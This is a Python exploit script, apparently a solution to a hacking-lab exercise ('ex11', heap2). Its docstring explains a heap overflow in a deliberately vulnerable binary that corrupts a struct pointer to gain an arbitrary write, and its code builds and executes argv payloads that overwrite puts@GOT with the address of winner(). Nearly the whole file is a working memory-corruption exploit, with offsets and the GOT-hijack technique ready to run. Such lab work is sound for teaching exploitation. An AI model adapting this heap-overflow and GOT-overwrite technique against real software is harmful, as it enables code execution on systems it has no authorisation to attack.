#!/usr/bin/env python3
"""
ex11 exploit  (heap2: overflow -> corrupt a pointer -> write-what-where -> GOT).

main(argv): builds two structs {int val; void *ptr;} on the heap:
    m1  = malloc(8); m1->val=1; m1->ptr = malloc(8);   // m1b
    m2  = malloc(8); m2->val=2; m2->ptr = malloc(8);   // m2b
    strcpy(m1->ptr, argv[1]);     // strcpy into m1b   <-- unbounded overflow
    strcpy(m2->ptr, argv[2]);     // strcpy into *m2->ptr
    puts("and that's a wrap folks!");
winner() @ 0x08048494 -> printf("and we have a winner @ %d", time()).

The four allocations are consecutive. Overflowing `m1b` (argv[1]) lets us overwrite
`m2->ptr` — the DESTINATION of the second strcpy. That turns the second strcpy into
an arbitrary write (write-what-where): we choose the address (via argv[1]) and the
bytes written there (argv[2]).

Plan: set m2->ptr = puts@GOT (0x08049774) and argv[2] = &winner (0x08048494).
Then strcpy writes winner's address into puts@GOT, and main's final puts() call
(`jmp *puts@GOT`) jumps into winner() -> win. (No RELRO -> GOT writable.)

Offset m1b -> m2->ptr = 20 bytes (each malloc(8) chunk is 0x10; verified by
brute force: 16->no, 20->win, 24->crash). Relative offset -> heap-ASLR independent;
GOT and winner are fixed (no PIE). All bytes are NUL-free.

Usage (VM):   python3 ex11.py /opt/hole-in-bin/ex11/bin
"""
import os
import struct
import sys

PUTS_GOT = 0x08049774
WINNER   = 0x08048494
OFFSET   = 20

argv1 = b"A" * OFFSET + struct.pack("<I", PUTS_GOT)   # overwrite m2->ptr with &puts@GOT
argv2 = struct.pack("<I", WINNER)                     # value written there

for n, a in (("argv1", argv1), ("argv2", argv2)):
    assert b"\x00" not in a, "%s has a NUL byte" % n

if len(sys.argv) > 1:
    target = sys.argv[1]
    os.execv(target, [target, argv1, argv2])
else:
    for a in (argv1, argv2):
        sys.stdout.write("".join("\\x%02x" % c for c in a) + "\n")
